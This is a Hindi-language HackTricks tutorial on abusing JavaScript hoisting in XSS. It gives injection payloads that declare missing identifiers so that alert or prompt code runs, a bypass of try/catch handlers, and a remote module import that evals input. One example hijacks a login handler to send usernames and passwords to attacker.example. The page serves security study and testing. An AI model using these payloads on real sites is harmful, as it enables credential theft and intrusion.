# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

JavaScript भाषा में एक ऐसा तंत्र मौजूद है जिसे **Hoisting** कहा जाता है, जिसमें variables, functions, classes, या imports की declarations को विचारात्मक रूप से उनके scope के शीर्ष पर उठाया जाता है, इससे पहले कि code execute हो। यह प्रक्रिया JavaScript engine द्वारा स्वचालित रूप से की जाती है, जो script को कई पासों में पार करता है।

पहले पास के दौरान, engine code को parse करता है ताकि syntax errors की जाँच हो और उसे एक abstract syntax tree में बदला जाए। इस चरण में hoisting शामिल है, एक ऐसी प्रक्रिया जिसमें कुछ declarations execution context के शीर्ष पर स्थानांतरित कर दिए जाते हैं। यदि parsing चरण सफल होता है (यानी कोई syntax error नहीं), तो script का execution आगे बढ़ता है।

यह समझना महत्वपूर्ण है कि:

1. script का execution तभी हो सकता है जब इसमें syntax errors न हों। Syntax नियमों का सख्ती से पालन आवश्यक है।
2. script में code को जहाँ रखा गया है, उसका execution पर प्रभाव पड़ता है hoisting के कारण, यद्यपि execute होने वाला code उसके textual representation से भिन्न हो सकता है।

#### Hoisting के प्रकार

MDN की जानकारी के आधार पर, JavaScript में hoisting के चार अलग प्रकार होते हैं:

1. **Value Hoisting**: किसी variable के value को उसकी declaration line से पहले उसके scope के भीतर उपयोग करने में सक्षम बनाता है।
2. **Declaration Hoisting**: किसी variable को उसकी declaration से पहले उसके scope के भीतर reference करने की अनुमति देता है बिना `ReferenceError` के, लेकिन variable का value `undefined` होगा।
3. यह प्रकार उसके scope के भीतर व्यवहार बदल देता है क्योंकि variable की declaration उसकी वास्तविक declaration line से पहले होती है।
4. Declaration के side effects उस कोड के बाकी हिस्सों के मूल्यांकन से पहले होते हैं जिसमें वह शामिल है।

विस्तार में, function declarations type 1 hoisting व्यवहार दिखाती हैं। `var` keyword type 2 व्यवहार प्रदर्शित करता है। Lexical declarations, जिनमें `let`, `const`, और `class` शामिल हैं, type 3 व्यवहार दिखाती हैं। अंत में, `import` statements अनोखे हैं क्योंकि इन्हें type 1 और type 4 दोनों व्यवहारों के साथ hoist किया जाता है।

## परिदृश्य

यदि आपके पास ऐसे परिदृश्य हैं जहाँ आप **Inject JS code after an undeclared object** का उपयोग किए जाने के बाद कोड inject कर सकते हैं, तो आप इसे declare करके **fix the syntax** कर सकते हैं (ताकि error throw करने के बजाय आपका कोड executed हो):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## और परिदृश्य
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting to bypass exception handling

जब sink को `try { x.y(...) } catch { ... }` में रैप किया गया हो, तो **ReferenceError** आपके payload के चलने से पहले execution को रोक देगी। आप missing identifier को pre-declare कर सकते हैं ताकि कॉल survive करे और आपकी injected expression पहले execute हो:
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` को मूल्यांकन से पहले hoisted कर दिया जाता है, इसलिए parser अब `x.y(...)` पर थ्रो नहीं करता; `prompt()` तब execute होता है जबकि `y` resolve नहीं हुआ होता, और उसके बाद आपके कोड के चलने के बाद `TypeError` फेंका जाता है।

### बाद के declarations को रोकें — const से नाम लॉक करके

यदि आप किसी top-level `function foo(){...}` के पार्स होने से पहले execute कर सकते हैं, तो उसी नाम के साथ एक लैक्सिकल बाइंडिंग घोषित करना (उदा., `const foo = ...`) बाद में उस function declaration द्वारा उस identifier को फिर से बाइंड करने से रोकेगा। इसे RXSS में पेज पर बाद में परिभाषित महत्वपूर्ण handlers को hijack करने के लिए दुरुपयोग किया जा सकता है:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
नोट्स
- यह execution order और global (top-level) scope पर निर्भर करता है।
- अगर आपका payload `eval()` के अंदर execute होता है, तो याद रखें कि `const/let` `eval` के अंदर block-scoped होते हैं और global bindings नहीं बनाते। एक नया `<script>` element inject करें जिसमें वह कोड हो जो एक वास्तविक global `const` स्थापित करे।

### Dynamic import() with user-controlled specifiers

सर्वर-साइड रेंडर्ड apps कभी-कभी components को lazy-load करने के लिए user input को `import()` में भेज देते हैं। अगर `import-in-the-middle` जैसे loader मौजूद हैं, तो specifier से wrapper modules जनरेट होते हैं। Hoisted import evaluation हमला-नियंत्रित module को subsequent lines के चलने से पहले fetch और execute कर देता है, जिससे SSR contexts में RCE संभव हो जाता है (देखें CVE-2023-38704)।

### Tooling

आधुनिक scanners ने explicit hoisting payloads जोड़ना शुरू कर दिया है। **KNOXSS v3.6.5** "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" और "Hoisting Override" test cases सूचीबद्ध करता है; इसे उन RXSS contexts पर चलाने से जो `ReferenceError`/`TypeError` थ्रो करते हैं, जल्दी से hoist-आधारित gadget उम्मीदवार सामने आ जाते हैं।

## संदर्भ

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
